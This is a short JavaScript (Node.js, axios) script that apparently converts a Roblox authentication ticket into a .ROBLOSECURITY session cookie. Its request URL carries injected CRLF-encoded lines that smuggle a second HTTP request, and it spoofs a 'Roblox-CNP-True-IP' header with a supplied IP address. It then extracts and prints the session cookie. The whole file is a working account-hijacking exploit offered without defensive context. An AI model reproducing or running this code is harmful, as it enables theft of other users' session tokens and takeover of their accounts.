const axios = require('axios');

authtocookie("cookie", "ip")

async function authtocookie(auth_ticket, ip){

    try {
        const result = await axios.post(`https://auth.roblox.qq.com/v1/authentication-ticket/redeem%20HTTP%2F1.1%0AHost%3A%20auth.roblox.com%0AContent-Length%3A%201106%0ARoblox-CNP-True-IP%3A%20${ip}%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F89.0.4389.128%20Safari%2F537.36%0AContent-Type%3A%20application%2Fjson%0ARBXAuthenticationNegotiation%3A%201%0A%0A%7B%22authenticationTicket%22%3A%20%22${auth_ticket}%22%7D`);
        const cookie = result.headers["set-cookie"].toString().split('.ROBLOSECURITY=').pop().split(';')[0];

        if(cookie.includes("_|WARNING:")){

            try{
                console.log(cookie)
            }catch (err){
                console.log(err)
            }
        }else{ 
          console.log("Not Found")
        }
    }catch (error){
        console.log(error)
    }
}